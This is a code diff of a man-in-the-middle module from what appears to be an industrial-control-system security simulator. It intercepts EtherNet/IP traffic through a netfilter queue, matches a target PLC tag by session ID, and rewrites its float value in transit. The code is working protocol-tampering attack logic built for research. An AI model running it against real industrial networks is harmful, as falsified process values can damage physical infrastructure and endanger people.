@@ -1,5 +1,3 @@
-#from dhalsim.network_attacks.enip_cip_parser.cip import *
-import dhalsim.network_attacks.enip_cip_parser.cip
 from dhalsim.network_attacks.mitm_netfilter_queue_subprocess import PacketQueue
 import argparse
 from pathlib import Path
@@ -12,12 +10,14 @@ from scapy.packet import Raw
 
 from dhalsim.network_attacks.utilities import translate_payload_to_float, translate_float_to_payload
 
+import struct
+
 class MiTMNetfilterQueue(PacketQueue):
 
     def __init__(self,  intermediate_yaml_path: Path, yaml_index: int, queue_number: int ):
         super().__init__(intermediate_yaml_path, yaml_index, queue_number)
         self.attacked_tag = self.intermediate_attack['tag']
-        self.session_id = 0
+        self.session_ids = []
 
     def capture(self, packet):
         """
@@ -28,50 +28,39 @@ class MiTMNetfilterQueue(PacketQueue):
         packet and delete the original checksum.
         :param packet: The captured packet.
         """
-        self.logger.debug('mitm capture method')
         try:
             p = IP(packet.get_payload())
+            if 'TCP' in p:
+                if len(p) == 116:
+                    this_session =  int.from_bytes(p[Raw].load[4:8], sys.byteorder)
+                    tag_name = p[Raw].load.decode(encoding='latin-1')[54:56]
+                    self.logger.debug('ENIP TCP Session ID: ' + str(this_session))
+                    self.logger.debug('Received tag is: ' + tag_name)
+                    self.logger.debug('Attack tag is: ' + self.attacked_tag)
+                    if self.attacked_tag == tag_name:
+                        self.logger.debug('Modifying tag: ' + tag_name)
+                        self.session_ids.append(this_session)
 
-            #self.logger.debug('packet')
-            if 'ENIP_TCP' in p:
-                if 'ENIP_SendRRData' in p:
-                    if 'CIP_ReqConnectionManager' in p:
-                        tag_name = p[Raw].load.decode(encoding='latin-1').split(':')[0][8:]
-                        self.logger.debug('ENIP TCP Session ID: ' + str(p['ENIP_TCP'].session))
-                        self.logger.debug('Received tag: ' + tag_name)
+                if len(p) == 102:
+                    this_session = int.from_bytes(p[Raw].load[4:8], sys.byteorder)
+                    if this_session in self.session_ids:
+                        self.logger.debug('Modifying because session is: ' + str(this_session))
+                        value = translate_payload_to_float(p[Raw].load)
+                        self.logger.debug('tag value is:' + str(value))
 
-                        if self.attacked_tag == tag_name:
-                            self.logger.debug('Modifying tag: ' + str(tag_name))
-                            self.session_id = p['ENIP_TCP'].session
-                            #self.logger.debug(p.show())
+                        if 'value' in self.intermediate_attack.keys():
+                            p[Raw].load = translate_float_to_payload(
+                                self.intermediate_attack['value'], p[Raw].load)
+                        elif 'offset' in self.intermediate_attack.keys():
+                            p[Raw].load = translate_float_to_payload(
+                                translate_payload_to_float(p[Raw].load) + self.intermediate_attack[
+                                    'offset'], p[Raw].load)
 
-                    else:
-                        this_session = p['ENIP_TCP'].session
-                        if self.session_id == this_session:
-                            value = translate_payload_to_float(p[Raw].load)
-                            self.logger.debug('tag value is:' + str(value))
-                            self.logger.debug('Tag ' + self.attacked_tag + ' is going to be modified')
-                            #self.logger.debug(p.show())
+                        del p[IP].chksum
+                        del p[TCP].chksum
 
-                            if 'value' in self.intermediate_attack.keys():
-                                p[Raw].load = translate_float_to_payload(
-                                    self.intermediate_attack['value'], p[Raw].load)
-                            elif 'offset' in self.intermediate_attack.keys():
-                                p[Raw].load = translate_float_to_payload(
-                                    translate_payload_to_float(p[Raw].load) + self.intermediate_attack[
-                                        'offset'], p[Raw].load)
-
-                            self.logger.debug \
-                                ('New payload tag value is: ' + str(translate_payload_to_float(p[Raw].load)))
-
-                            del p[IP].chksum
-                            del p[TCP].chksum
-
-                            packet.set_payload(bytes(p))
-                            self.logger.debug(f"Value of network packet for {p[IP].dst} overwritten.")
-                            #self.logger.debug(p.show())
-                            packet.drop()
-                            return
+                        packet.set_payload(bytes(p))
+                        self.logger.debug(f"Value of network packet for {p[IP].dst} overwritten.")
 
             packet.accept()
         except Exception as exc:
